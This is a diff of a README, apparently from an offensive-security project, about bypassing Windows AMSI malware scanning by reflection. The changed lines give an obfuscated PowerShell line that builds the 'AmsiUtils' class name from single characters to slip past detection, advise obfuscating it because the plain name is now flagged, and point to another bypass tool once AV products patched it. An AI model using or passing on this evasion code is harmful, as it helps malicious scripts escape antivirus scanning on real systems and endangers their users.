@@ -26,7 +26,11 @@ Matt Graeber first introduced the technique to bypass AMSI by using reflection i
 ```diff
 ! UPDATE 11/11/2024 
 !  "System.Management.Automation.AmsiUtils" is being flagged now, just do a basic obfuscation of it, like the example below and it works again 
-! $o = [Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s")
+! $o = [Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s"))
+```
+```diff
+! UPDATE 27/05/25
+! Patched on some AV products .. use https://github.com/cybersectroll/TrollDisappearKey instead
 ```
 
 ## Benefits
